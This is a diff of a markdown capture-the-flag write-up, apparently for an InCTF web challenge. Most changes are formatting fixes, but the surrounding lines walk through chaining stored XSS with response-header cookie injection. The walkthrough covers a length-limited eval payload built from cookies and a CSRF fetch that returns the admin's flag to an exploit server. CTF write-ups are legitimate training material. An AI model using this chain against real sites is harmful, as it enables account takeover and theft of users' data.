@@ -16,7 +16,7 @@ description: Stored XSS and Response Header Injection Leads to CSRF
 
 At first glance, it is very clear that the site was vulnerable to XSS. For instance, adding the note `<h1>Test</h1>` results in the heading tags being injected:
 
-![](../../.gitbook/assets/screenshot-2021-08-16-at-9.07.57-pm.png)
+![](<../../.gitbook/assets/Screenshot 2021-08-16 at 9.07.57 PM.png>)
 
 When the page is first loaded, the `init()` function is called, and the displayed note's innerHTML is changed to the `/get` response.
 
@@ -95,7 +95,7 @@ var cType = map[string]string{
 }
 ```
 
-Since the notes are fetched based on the user's cookies, we still do not have a way to perform an XSS attack on the admin \(we would only be able to do it to ourselves!\). 
+Since the notes are fetched based on the user's cookies, we still do not have a way to perform an XSS attack on the admin (we would only be able to do it to ourselves!). 
 
 ### Response Header Injection
 
@@ -171,11 +171,11 @@ func find(w http.ResponseWriter, r *http.Request) {
 
 Remember how we couldn't get the admin to visit our note previously? Well, now we can! All we have to do is to inject a `Set-Cookie` header, setting the admin's ID cookie to our own.
 
-But we still need the original admin's ID \(otherwise, how do we get the admin's note?\). We can get around that quite easily, though - by simply setting the `Path` of our custom cookie to `/get`, we can make sure that when the admin visits our main site, our custom `id` cookie is used \(since the longest match "wins"\). However, since the admin's original `id` cookie still exists with the `Path` set to `/`, the `/find` endpoint will still use the original admin ID.
+But we still need the original admin's ID (otherwise, how do we get the admin's note?). We can get around that quite easily, though - by simply setting the `Path` of our custom cookie to `/get`, we can make sure that when the admin visits our main site, our custom `id` cookie is used (since the longest match "wins"). However, since the admin's original `id` cookie still exists with the `Path` set to `/`, the `/find` endpoint will still use the original admin ID.
 
 ### Crafting Our Payload
 
-_On hindsight, this was way more complex than necessary. The intended solution simply used `eval(window.name)`, since `window.name` can be set by the attacker when using `window.open()`. I'll share mine anyway, because it was quite interesting \(to me at least\)._
+_On hindsight, this was way more complex than necessary. The intended solution simply used `eval(window.name)`, since `window.name` can be set by the attacker when using `window.open()`. I'll share mine anyway, because it was quite interesting (to me at least)._
 
 Since we’re in innerHTML, the ideal way is to append a new script element and fetch our external script:
 
@@ -185,7 +185,7 @@ But there’s a 75 character limit in order for the XSS payload to be stored.
 
 I ended up using cookies, since `document.cookies` will return a string like:
 
-```text
+```
 cookieA=valueA; cookieB=valueB; ...
 ```
 
@@ -195,7 +195,7 @@ This format is very convenient to create JS code which we can `eval()`. Let the 
 var x = eval(alert())
 ```
 
-Since the header values _also_ have a length limit of 50 characters, we need to set multiple cookies. Essentially, the `document.cookies` will return the following string \(newlines inserted for clarity\):
+Since the header values _also_ have a length limit of 50 characters, we need to set multiple cookies. Essentially, the `document.cookies` will return the following string (newlines inserted for clarity):
 
 ```javascript
 var A = "SOME_STRING";
@@ -306,17 +306,17 @@ function wait(time) {
 
 Visiting these URLs set the following cookies. Notice that we have set the `id` cookie with the `/get` path, and that the original `id` with the `/` path is preserved.
 
-![](../../.gitbook/assets/image%20%2863%29.png)
+![](<../../.gitbook/assets/image (45).png>)
 
 After `document.cookie.split('; ').sort()`, the previously inserted cookies will be in the correct order, starting from `var A`, and each subsequent variable builds on top of the previous variable.
 
-![](../../.gitbook/assets/image%20%2845%29.png)
+![](<../../.gitbook/assets/image (46).png>)
 
 `var a` will end up being the full payload:
 
-![](../../.gitbook/assets/image%20%2859%29.png)
+![](<../../.gitbook/assets/image (47).png>)
 
-This is finally eval-ed again \(inside the eval\) by `var b`.
+This is finally eval-ed again (inside the eval) by `var b`.
 
 The XSS payload is then:
 
@@ -326,11 +326,11 @@ The XSS payload is then:
 
 This takes up 70 characters, satisfying the length requirement in order to be stored.
 
-![](../../.gitbook/assets/image%20%2857%29.png)
+![](<../../.gitbook/assets/image (48).png>)
 
 Now, we can store this XSS payload! When the admin visits the site, our payload is fetched:
 
-![](../../.gitbook/assets/image%20%2860%29.png)
+![](<../../.gitbook/assets/image (49).png>)
 
 The only thing left now is to perform a CSRF to the `/find` endpoint to get the flag, and make a callback to our exploit server with the data.
 
@@ -347,9 +347,8 @@ fetch('find?startsWith=in')
 
 This took way too long, because I didn't think of the simple `window.name` payload! 
 
-![](../../.gitbook/assets/image%20%2853%29.png)
+![](<../../.gitbook/assets/image (50).png>)
 
 Regardless, I was excited to finally the flag, after way more pain than necessary.
 
 `inctf{youll_never_take_me_alive_ialmvwoawpwe}`
-
